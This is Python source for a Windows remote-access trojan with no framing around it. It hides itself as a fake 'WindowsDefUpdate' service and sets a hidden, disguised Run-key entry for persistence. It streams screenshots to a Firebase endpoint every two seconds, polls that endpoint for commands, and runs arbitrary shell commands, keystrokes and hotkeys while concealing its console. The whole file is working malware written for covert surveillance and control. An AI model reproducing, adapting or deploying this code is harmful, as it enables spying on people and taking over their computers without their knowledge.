import requests
import time
import os
import ctypes
import sys
import win32com.client
import subprocess
import shutil
import pyautogui
import base64
import threading
from io import BytesIO

def make_persistent():
    try:
        appdata = os.getenv('APPDATA')
        target_dir = os.path.join(appdata, "WindowsDefUpdate")
        if not os.path.exists(target_dir):
            os.makedirs(target_dir)
        target_file = os.path.join(target_dir, "win_service_host.exe")
        if not os.path.exists(target_file):
            shutil.copyfile(sys.executable, target_file)
            ctypes.windll.kernel32.SetFileAttributesW(target_file, 0x02 | 0x04)
            reg_cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinUpdateProvider" /t REG_SZ /d "{target_file}" /f'
            subprocess.Popen(reg_cmd, shell=True, creationflags=0x08000000)
    except:
        pass
def stream_screen():
    screen_url = "https://a0zai-56c3a-default-rtdb.europe-west1.firebasedatabase.app/A0Z_CORE/live_screen.json"
    while True:
        try:
            screenshot = pyautogui.screenshot()
            buffered = BytesIO()
            screenshot.save(buffered, format="JPEG", quality=20)
            img_str = base64.b64encode(buffered.getvalue()).decode()
            requests.put(screen_url, json={"image": img_str})
            time.sleep(2)
        except:
            time.sleep(5)
def hide_console():
    hWnd = ctypes.WinDLL('kernel32').GetConsoleWindow()
    if hWnd:
        ctypes.WinDLL('user32').ShowWindow(hWnd, 0)
def speak(text):
    try:
        speaker = win32com.client.Dispatch("SAPI.SpVoice")
        speaker.Speak(text)
    except:
        pass
def execute_command(command):
    
    try:
        subprocess.Popen(command, shell=True, creationflags=0x08000000)
    except:
        pass
def start_gateway():
    make_persistent()
    threading.Thread(target=stream_screen, daemon=True).start()
    time.sleep(5)
    hide_console()   
    db_url = "https://a0zai-56c3a-default-rtdb.europe-west1.firebasedatabase.app/A0Z_CORE/current_command.json"
    last_timestamp = 0
    while True:
        try:
            response = requests.get(db_url)
            data = response.json()
            if data:
                text = data.get('text', '')
                ts = data.get('timestamp', 0)
                if ts > last_timestamp:
                    if text.startswith("/say "):
                        speak(text.replace("/say ", ""))
                    elif text.startswith("/cmd "):
                        execute_command(text.replace("/cmd ", ""))
                    elif text.startswith("/type "):
                        pyautogui.write(text.replace("/type ", ""), interval=0.1)
                    elif text.startswith("/press "):
                        keys = text.replace("/press ", "").split()
                        pyautogui.hotkey(*keys)
                    last_timestamp = ts
        except:
            pass
        time.sleep(1)

if __name__ == "__main__":
    start_gateway()